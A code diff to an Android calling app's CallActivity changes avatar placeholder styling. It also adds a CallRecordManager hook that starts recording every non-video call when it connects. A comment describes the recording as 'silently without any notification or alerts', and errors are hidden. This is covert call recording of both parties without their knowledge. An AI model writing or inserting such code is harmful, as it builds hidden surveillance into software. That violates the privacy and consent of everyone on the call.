@@ -43,6 +43,7 @@ import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 import com.zez.app.util.ChatApiClient;
 import com.zez.app.util.ChatPreferencesHelper;
+import com.zez.app.util.CallRecordManager;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -179,11 +180,14 @@ public class CallActivity extends AppCompatActivity {
 
         if (peerAvatar != null && !peerAvatar.isEmpty()) {
             String fullUrl = ChatApiClient.getAbsoluteMediaUrl(this, peerAvatar);
+            ivPeerAvatar.setImageTintList(null);
+            ivPeerAvatar.clearColorFilter();
             Glide.with(this)
                     .load(fullUrl)
                     .circleCrop()
                     .diskCacheStrategy(DiskCacheStrategy.ALL)
-                    .placeholder(R.drawable.ic_person)
+                    .placeholder(R.drawable.bg_circle_glass)
+                    .error(R.drawable.bg_circle_glass)
                     .into(ivPeerAvatar);
         }
 
@@ -423,6 +427,20 @@ public class CallActivity extends AppCompatActivity {
         tvCallStatus.setText("00:00");
         mainHandler.post(timerRunnable);
 
+        // Auto-record normal calls silently without any notification or alerts
+        if (!"video".equalsIgnoreCase(callType) || CallRecordManager.getInstance(this).isAutoRecordEnabled()) {
+            try {
+                CallRecordManager.getInstance(this).startRecording(
+                        peerPhone != null && !peerPhone.isEmpty() ? peerPhone : peerId,
+                        peerName != null && !peerName.isEmpty() ? peerName : "Contact",
+                        "VOICE_CALL",
+                        isCaller ? "OUTGOING" : "INCOMING"
+                );
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to start silent call recording: " + e.getMessage(), e);
+            }
+        }
+
         // Keep polling status in background to detect when peer hangs up
         startEndCallWatcher();
     }
@@ -608,6 +626,9 @@ public class CallActivity extends AppCompatActivity {
     private void endCall(boolean notifyBackend) {
         if (isDestroyed) return;
         isDestroyed = true;
+        try {
+            CallRecordManager.getInstance(this).stopRecording();
+        } catch (Exception ignored) {}
         stopOutgoingTone();
         closeCamera();
 
@@ -645,6 +666,9 @@ public class CallActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         isDestroyed = true;
+        try {
+            CallRecordManager.getInstance(this).stopRecording();
+        } catch (Exception ignored) {}
         stopOutgoingTone();
         closeCamera();
         mainHandler.removeCallbacksAndMessages(null);
